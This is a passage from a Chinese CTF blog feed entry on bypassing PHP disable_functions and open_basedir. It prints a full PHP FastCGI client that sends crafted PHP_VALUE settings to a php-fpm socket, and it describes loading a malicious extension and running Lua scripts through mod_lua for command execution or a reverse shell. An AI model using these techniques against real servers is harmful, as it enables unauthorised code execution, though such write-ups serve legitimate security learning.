class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TimedOutException extends Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line">class ForbiddenException extends Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line">class Client &#123;</span><br><span class="line">const VERSION_1 &#x3D; 1;</span><br><span class="line">const BEGIN_REQUEST &#x3D; 1;</span><br><span class="line">const ABORT_REQUEST &#x3D; 2;</span><br><span class="line">const END_REQUEST &#x3D; 3;</span><br><span class="line">const PARAMS &#x3D; 4;</span><br><span class="line">const STDIN &#x3D; 5;</span><br><span class="line">const STDOUT &#x3D; 6;</span><br><span class="line">const STDERR &#x3D; 7;</span><br><span class="line">const DATA &#x3D; 8;</span><br><span class="line">const GET_VALUES &#x3D; 9;</span><br><span class="line">const GET_VALUES_RESULT &#x3D; 10;</span><br><span class="line">const UNKNOWN_TYPE &#x3D; 11;</span><br><span class="line">const MAXTYPE &#x3D; self::UNKNOWN_TYPE;</span><br><span class="line">const RESPONDER &#x3D; 1;</span><br><span class="line">const AUTHORIZER &#x3D; 2;</span><br><span class="line">const FILTER &#x3D; 3;</span><br><span class="line">const REQUEST_COMPLETE &#x3D; 0;</span><br><span class="line">const CANT_MPX_CONN &#x3D; 1;</span><br><span class="line">const OVERLOADED &#x3D; 2;</span><br><span class="line">const UNKNOWN_ROLE &#x3D; 3;</span><br><span class="line">const MAX_CONNS &#x3D; &#39;MAX_CONNS&#39;;</span><br><span class="line">const MAX_REQS &#x3D; &#39;MAX_REQS&#39;;</span><br><span class="line">const MPXS_CONNS &#x3D; &#39;MPXS_CONNS&#39;;</span><br><span class="line">const HEADER_LEN &#x3D; 8;</span><br><span class="line">const REQ_STATE_WRITTEN &#x3D; 1;</span><br><span class="line">const REQ_STATE_OK &#x3D; 2;</span><br><span class="line">const REQ_STATE_ERR &#x3D; 3;</span><br><span class="line">const REQ_STATE_TIMED_OUT &#x3D; 4;</span><br><span class="line">private $_sock &#x3D; null;</span><br><span class="line">private $_host &#x3D; null;</span><br><span class="line">private $_port &#x3D; null;</span><br><span class="line">private $_keepAlive &#x3D; false;</span><br><span class="line">private $_requests &#x3D; array();</span><br><span class="line">private $_persistentSocket &#x3D; false;</span><br><span class="line">private $_connectTimeout &#x3D; 5000;</span><br><span class="line">private $_readWriteTimeout &#x3D; 5000;</span><br><span class="line">public function __construct( $host, $port ) &#123;</span><br><span class="line">    $this-&gt;_host &#x3D; $host;</span><br><span class="line">    $this-&gt;_port &#x3D; $port;</span><br><span class="line">&#125;</span><br><span class="line">public function setKeepAlive( $b ) &#123;</span><br><span class="line">          $this-&gt;_keepAlive &#x3D; (boolean) $b;</span><br><span class="line">          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) &#123;</span><br><span class="line">              fclose( $this-&gt;_sock );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public function getKeepAlive() &#123;</span><br><span class="line">    return $this-&gt;_keepAlive;</span><br><span class="line">&#125;</span><br><span class="line">public function setPersistentSocket( $b ) &#123;</span><br><span class="line">          $was_persistent          &#x3D; ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );</span><br><span class="line">          $this-&gt;_persistentSocket &#x3D; (boolean) $b;</span><br><span class="line">          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) &#123;</span><br><span class="line">              fclose( $this-&gt;_sock );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public function getPersistentSocket() &#123;</span><br><span class="line">    return $this-&gt;_persistentSocket;</span><br><span class="line">&#125;</span><br><span class="line">public function setConnectTimeout( $timeoutMs ) &#123;</span><br><span class="line">          $this-&gt;_connectTimeout &#x3D; $timeoutMs;</span><br><span class="line">&#125;</span><br><span class="line">public function getConnectTimeout() &#123;</span><br><span class="line">    return $this-&gt;_connectTimeout;</span><br><span class="line">&#125;</span><br><span class="line">public function setReadWriteTimeout( $timeoutMs ) &#123;</span><br><span class="line">          $this-&gt;_readWriteTimeout &#x3D; $timeoutMs;</span><br><span class="line">          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );</span><br><span class="line">&#125;</span><br><span class="line">public function getReadWriteTimeout() &#123;</span><br><span class="line">    return $this-&gt;_readWriteTimeout;</span><br><span class="line">&#125;</span><br><span class="line">private function set_ms_timeout( $timeoutMs ) &#123;</span><br><span class="line">          if ( ! $this-&gt;_sock ) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs &#x2F; 1000 ), ( $timeoutMs % 1000 ) * 1000 );</span><br><span class="line">&#125;</span><br><span class="line">private function connect() &#123;</span><br><span class="line">    if ( ! $this-&gt;_sock ) &#123;</span><br><span class="line">              if ( $this-&gt;_persistentSocket ) &#123;</span><br><span class="line">                  $this-&gt;_sock &#x3D; pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout &#x2F; 1000 );</span><br><span class="line">              &#125; else &#123;</span><br><span class="line">                  $this-&gt;_sock &#x3D; fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout &#x2F; 1000 );</span><br><span class="line">              &#125;</span><br><span class="line">              if ( ! $this-&gt;_sock ) &#123;</span><br><span class="line">                  throw new Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );</span><br><span class="line">              &#125;</span><br><span class="line">              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) &#123;</span><br><span class="line">            throw new Exception( &#39;Unable to set timeout on socket&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">private function buildPacket( $type, $content, $requestId &#x3D; 1 ) &#123;</span><br><span class="line">          $clen &#x3D; strlen( $content );</span><br><span class="line">    return chr( self::VERSION_1 )         &#x2F;* version *&#x2F;</span><br><span class="line">           . chr( $type )                    &#x2F;* type *&#x2F;</span><br><span class="line">                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) &#x2F;* requestIdB1 *&#x2F;</span><br><span class="line">           . chr( $requestId &amp; 0xFF )        &#x2F;* requestIdB0 *&#x2F;</span><br><span class="line">                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     &#x2F;* contentLengthB1 *&#x2F;</span><br><span class="line">           . chr( $clen &amp; 0xFF )             &#x2F;* contentLengthB0 *&#x2F;</span><br><span class="line">                 . chr( 0 )                        &#x2F;* paddingLength *&#x2F;</span><br><span class="line">                 . chr( 0 )                        &#x2F;* reserved *&#x2F;</span><br><span class="line">                 . $content;                     &#x2F;* content *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">private function buildNvpair( $name, $value ) &#123;</span><br><span class="line">    $nlen &#x3D; strlen( $name );</span><br><span class="line">    $vlen &#x3D; strlen( $value );</span><br><span class="line">    if ( $nlen &lt; 128 ) &#123;</span><br><span class="line">              &#x2F;* nameLengthB0 *&#x2F;</span><br><span class="line">              $nvpair &#x3D; chr( $nlen );</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">              &#x2F;* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 *&#x2F;</span><br><span class="line">              $nvpair &#x3D; chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );</span><br><span class="line">          &#125;</span><br><span class="line">          if ( $vlen &lt; 128 ) &#123;</span><br><span class="line">        &#x2F;* valueLengthB0 *&#x2F;</span><br><span class="line">        $nvpair .&#x3D; chr( $vlen );</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 *&#x2F;</span><br><span class="line">        $nvpair .&#x3D; chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* nameData &amp; valueData *&#x2F;</span><br><span class="line">    return $nvpair . $name . $value;</span><br><span class="line">&#125;</span><br><span class="line">private function readNvpair( $data, $length &#x3D; null ) &#123;</span><br><span class="line">    $array &#x3D; array();</span><br><span class="line">          if ( $length &#x3D;&#x3D;&#x3D; null ) &#123;</span><br><span class="line">        $length &#x3D; strlen( $data );</span><br><span class="line">    &#125;</span><br><span class="line">    $p &#x3D; 0;</span><br><span class="line">          while ( $p !&#x3D; $length ) &#123;</span><br><span class="line">              $nlen &#x3D; ord( $data&#123;$p ++&#125; );</span><br><span class="line">              if ( $nlen &gt;&#x3D; 128 ) &#123;</span><br><span class="line">                  $nlen &#x3D; ( $nlen &amp; 0x7F &lt;&lt; 24 );</span><br><span class="line">                  $nlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 16 );</span><br><span class="line">                  $nlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 8 );</span><br><span class="line">                  $nlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) );</span><br><span class="line">              &#125;</span><br><span class="line">              $vlen &#x3D; ord( $data&#123;$p ++&#125; );</span><br><span class="line">              if ( $vlen &gt;&#x3D; 128 ) &#123;</span><br><span class="line">                  $vlen &#x3D; ( $nlen &amp; 0x7F &lt;&lt; 24 );</span><br><span class="line">                  $vlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 16 );</span><br><span class="line">                  $vlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 8 );</span><br><span class="line">                  $vlen |&#x3D; ( ord( $data&#123;$p ++&#125; ) );</span><br><span class="line">              &#125;</span><br><span class="line">              $array[ substr( $data, $p, $nlen ) ] &#x3D; substr( $data, $p + $nlen, $vlen );</span><br><span class="line">              $p                                   +&#x3D; ( $nlen + $vlen );</span><br><span class="line">    &#125;</span><br><span class="line">    return $array;</span><br><span class="line">&#125;</span><br><span class="line">private function decodePacketHeader( $data ) &#123;</span><br><span class="line">          $ret                  &#x3D; array();</span><br><span class="line">          $ret[&#39;version&#39;]       &#x3D; ord( $data&#123;0&#125; );</span><br><span class="line">          $ret[&#39;type&#39;]          &#x3D; ord( $data&#123;1&#125; );</span><br><span class="line">          $ret[&#39;requestId&#39;]     &#x3D; ( ord( $data&#123;2&#125; ) &lt;&lt; 8 ) + ord( $data&#123;3&#125; );</span><br><span class="line">          $ret[&#39;contentLength&#39;] &#x3D; ( ord( $data&#123;4&#125; ) &lt;&lt; 8 ) + ord( $data&#123;5&#125; );</span><br><span class="line">          $ret[&#39;paddingLength&#39;] &#x3D; ord( $data&#123;6&#125; );</span><br><span class="line">          $ret[&#39;reserved&#39;]      &#x3D; ord( $data&#123;7&#125; );</span><br><span class="line">    return $ret;</span><br><span class="line">&#125;</span><br><span class="line">private function readPacket() &#123;</span><br><span class="line">    if ( $packet &#x3D; fread( $this-&gt;_sock, self::HEADER_LEN ) ) &#123;</span><br><span class="line">        $resp            &#x3D; $this-&gt;decodePacketHeader( $packet );</span><br><span class="line">              $resp[&#39;content&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">        if ( $resp[&#39;contentLength&#39;] ) &#123;</span><br><span class="line">                  $len &#x3D; $resp[&#39;contentLength&#39;];</span><br><span class="line">                  while ( $len &amp;&amp; ( $buf &#x3D; fread( $this-&gt;_sock, $len ) ) !&#x3D;&#x3D; false ) &#123;</span><br><span class="line">                      $len             -&#x3D; strlen( $buf );</span><br><span class="line">                      $resp[&#39;content&#39;] .&#x3D; $buf;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( $resp[&#39;paddingLength&#39;] ) &#123;</span><br><span class="line">            $buf &#x3D; fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );</span><br><span class="line">        &#125;</span><br><span class="line">        return $resp;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public function getValues( array $requestedInfo ) &#123;</span><br><span class="line">          $this-&gt;connect();</span><br><span class="line">          $request &#x3D; &#39;&#39;;</span><br><span class="line">          foreach ( $requestedInfo as $info ) &#123;</span><br><span class="line">              $request .&#x3D; $this-&gt;buildNvpair( $info, &#39;&#39; );</span><br><span class="line">          &#125;</span><br><span class="line">          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );</span><br><span class="line">          $resp &#x3D; $this-&gt;readPacket();</span><br><span class="line">          if ( $resp[&#39;type&#39;] &#x3D;&#x3D; self::GET_VALUES_RESULT ) &#123;</span><br><span class="line">              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public function request( array $params, $stdin ) &#123;</span><br><span class="line">    $id &#x3D; $this-&gt;async_request( $params, $stdin );</span><br><span class="line">    return $this-&gt;wait_for_response( $id );</span><br><span class="line">&#125;</span><br><span class="line">public function async_request( array $params, $stdin ) &#123;</span><br><span class="line">    $this-&gt;connect();</span><br><span class="line">          &#x2F;&#x2F; Pick random number between 1 and max 16 bit unsigned int 65535</span><br><span class="line">          $id &#x3D; mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );</span><br><span class="line">    &#x2F;&#x2F; Using persistent sockets implies you want them keept alive by server!</span><br><span class="line">    $keepAlive     &#x3D; intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );</span><br><span class="line">          $request       &#x3D; $this-&gt;buildPacket( self::BEGIN_REQUEST</span><br><span class="line">              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )</span><br><span class="line">        , $id</span><br><span class="line">          );</span><br><span class="line">          $paramsRequest &#x3D; &#39;&#39;;</span><br><span class="line">    foreach ( $params as $key &#x3D;&gt; $value ) &#123;</span><br><span class="line">              $paramsRequest .&#x3D; $this-&gt;buildNvpair( $key, $value, $id );</span><br><span class="line">          &#125;</span><br><span class="line">          if ( $paramsRequest ) &#123;</span><br><span class="line">        $request .&#x3D; $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );</span><br><span class="line">    &#125;</span><br><span class="line">    $request .&#x3D; $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );</span><br><span class="line">          if ( $stdin ) &#123;</span><br><span class="line">        $request .&#x3D; $this-&gt;buildPacket( self::STDIN, $stdin, $id );</span><br><span class="line">    &#125;</span><br><span class="line">    $request .&#x3D; $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );</span><br><span class="line">          if ( fwrite( $this-&gt;_sock, $request ) &#x3D;&#x3D;&#x3D; false || fflush( $this-&gt;_sock ) &#x3D;&#x3D;&#x3D; false ) &#123;</span><br><span class="line">        $info &#x3D; stream_get_meta_data( $this-&gt;_sock );</span><br><span class="line">        if ( $info[&#39;timed_out&#39;] ) &#123;</span><br><span class="line">                  throw new TimedOutException( &#39;Write timed out&#39; );</span><br><span class="line">              &#125;</span><br><span class="line">              &#x2F;&#x2F; Broken pipe, tear down so future requests might succeed</span><br><span class="line">              fclose( $this-&gt;_sock );</span><br><span class="line">        throw new Exception( &#39;Failed to write request to socket&#39; );</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;_requests[ $id ] &#x3D; array(</span><br><span class="line">        &#39;state&#39;    &#x3D;&gt; self::REQ_STATE_WRITTEN,</span><br><span class="line">        &#39;response&#39; &#x3D;&gt; null</span><br><span class="line">    );</span><br><span class="line">    return $id;</span><br><span class="line">&#125;</span><br><span class="line">public function wait_for_response( $requestId, $timeoutMs &#x3D; 0 ) &#123;</span><br><span class="line">    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) &#123;</span><br><span class="line">        throw new Exception( &#39;Invalid request id given&#39; );</span><br><span class="line">    &#125;</span><br><span class="line">    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] &#x3D;&#x3D; self::REQ_STATE_OK</span><br><span class="line">         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] &#x3D;&#x3D; self::REQ_STATE_ERR</span><br><span class="line">    ) &#123;</span><br><span class="line">        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">    if ( $timeoutMs &gt; 0 ) &#123;</span><br><span class="line">              &#x2F;&#x2F; Reset timeout on socket for now</span><br><span class="line">              $this-&gt;set_ms_timeout( $timeoutMs );</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">              $timeoutMs &#x3D; $this-&gt;_readWriteTimeout;</span><br><span class="line">    &#125;</span><br><span class="line">    $startTime &#x3D; microtime( true );</span><br><span class="line">          do &#123;</span><br><span class="line">              $resp &#x3D; $this-&gt;readPacket();</span><br><span class="line">              if ( $resp[&#39;type&#39;] &#x3D;&#x3D; self::STDOUT || $resp[&#39;type&#39;] &#x3D;&#x3D; self::STDERR ) &#123;</span><br><span class="line">                  if ( $resp[&#39;type&#39;] &#x3D;&#x3D; self::STDERR ) &#123;</span><br><span class="line">                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] &#x3D; self::REQ_STATE_ERR;</span><br><span class="line">                  &#125;</span><br><span class="line">                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .&#x3D; $resp[&#39;content&#39;];</span><br><span class="line">              &#125;</span><br><span class="line">              if ( $resp[&#39;type&#39;] &#x3D;&#x3D; self::END_REQUEST ) &#123;</span><br><span class="line">                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] &#x3D; self::REQ_STATE_OK;</span><br><span class="line">                  if ( $resp[&#39;requestId&#39;] &#x3D;&#x3D; $requestId ) &#123;</span><br><span class="line">                      break;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( microtime( true ) - $startTime &gt;&#x3D; ( $timeoutMs * 1000 ) ) &#123;</span><br><span class="line">                  &#x2F;&#x2F; Reset</span><br><span class="line">                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );</span><br><span class="line">                  throw new Exception( &#39;Timed out&#39; );</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; while ( $resp );</span><br><span class="line">    if ( ! is_array( $resp ) ) &#123;</span><br><span class="line">              $info &#x3D; stream_get_meta_data( $this-&gt;_sock );</span><br><span class="line">              &#x2F;&#x2F; We must reset timeout but it must be AFTER we get info</span><br><span class="line">              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );</span><br><span class="line">              if ( $info[&#39;timed_out&#39;] ) &#123;</span><br><span class="line">                  throw new TimedOutException( &#39;Read timed out&#39; );</span><br><span class="line">              &#125;</span><br><span class="line">              if ( $info[&#39;unread_bytes&#39;] &#x3D;&#x3D; 0</span><br><span class="line">                   &amp;&amp; $info[&#39;blocked&#39;]</span><br><span class="line">                   &amp;&amp; $info[&#39;eof&#39;] ) &#123;</span><br><span class="line">                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );</span><br><span class="line">              &#125;</span><br><span class="line">              throw new Exception( &#39;Read failed&#39; );</span><br><span class="line">          &#125;</span><br><span class="line">          &#x2F;&#x2F; Reset timeout</span><br><span class="line">          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );</span><br><span class="line">          switch ( ord( $resp[&#39;content&#39;]&#123;4&#125; ) ) &#123;</span><br><span class="line">        case self::CANT_MPX_CONN:</span><br><span class="line">            throw new Exception( &#39;This app can&#39;t multiplex [CANT_MPX_CONN]&#39; );</span><br><span class="line">            break;</span><br><span class="line">        case self::OVERLOADED:</span><br><span class="line">            throw new Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );</span><br><span class="line">            break;</span><br><span class="line">        case self::UNKNOWN_ROLE:</span><br><span class="line">            throw new Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );</span><br><span class="line">            break;</span><br><span class="line">        case self::REQUEST_COMPLETE:</span><br><span class="line">            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$client    &#x3D; new Client(&quot;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;php-cgi.sock&quot;, -1);#套接字的地址</span><br><span class="line">  $php_value &#x3D; &quot;open_basedir &#x3D; &#x2F;&quot;;#要修改的配置</span><br><span class="line">$filepath  &#x3D; &#39;&#x2F;tmp&#x2F;readflag.php&#39;;#要执行的文件</span><br><span class="line">  $content   &#x3D; &#39;hpdoger&#39;;</span><br><span class="line">echo $client-&gt;request(</span><br><span class="line">      array(</span><br><span class="line">          &#39;GATEWAY_INTERFACE&#39; &#x3D;&gt; &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">          &#39;REQUEST_METHOD&#39;    &#x3D;&gt; &#39;POST&#39;,</span><br><span class="line">          &#39;SCRIPT_FILENAME&#39;   &#x3D;&gt; $filepath,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;   &#x3D;&gt; &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;       &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;       &#x3D;&gt; &#39;9985&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;       &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;       &#x3D;&gt; &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;       &#x3D;&gt; &#39;mag-tured&#39;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;   &#x3D;&gt; &#39;HTTP&#x2F;1.1&#39;,</span><br><span class="line">    &#39;CONTENT_TYPE&#39;      &#x3D;&gt; &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">    &#39;CONTENT_LENGTH&#39;    &#x3D;&gt; strlen( $content ),</span><br><span class="line">          &#39;PHP_VALUE&#39;         &#x3D;&gt; $php_value,</span><br><span class="line">),</span><br><span class="line">$content</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>通过<code>$php_value = &quot;open_basedir = /&quot;;</code>修改协议，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir。</p><p>根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>，必须要实际有这个文件</p><p>带用套接字<strong>new</strong> Client(“unix:///tmp/php-cgi.sock”, -1)</p><p>这里通过设置,PHP_ADMIN_VALUE[‘extension’] = /tmp/sky.so,加载扩展，引入我们的so文件从而达到可以让他执行，这样就可以达到命令执行，甚至还可以反弹shell</p><h2 id="五、通过lua脚本绕过php的限制"><a href="#五、通过lua脚本绕过php的限制" class="headerlink" title="五、通过lua脚本绕过php的限制"></a>五、通过lua脚本绕过php的限制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#LoadModule lua_module modules&#x2F;mod_lua.so</span><br></pre></td></tr></table></figure><p>官网的介绍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod_lua provides a handler named lua-script, which can be used with a SetHandler or AddHandler directive:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;*.lua&quot;&gt;</span><br><span class="line">    SetHandler lua-script</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure><p>这样就可以通过上传lua脚本来进行执行系统命令了，骚操作一波，<strong>这个注意环境的实现才能真正的运行。</strong>不可在htaccess文件中进行加载module</p><h2 id="六、西湖论剑的官方WP给了一个"><a href="#六、西湖论剑的官方WP给了一个" class="headerlink" title="六、西湖论剑的官方WP给了一个"></a>六、西湖论剑的官方WP给了一个</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;绕过DisFunc的常见小技巧&quot;&gt;&lt;a href=&quot;#绕过DisFunc的常见小技巧&quot; class=&quot;headerlink&quot; title=&quot;绕过DisFunc的常见小技巧&quot;&gt;&lt;/a&gt;绕过DisFunc的常见小技巧&lt;/h1&gt;&lt;p&gt;解析webshell命令不能执行时的</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>西湖丢脸大赛</title>
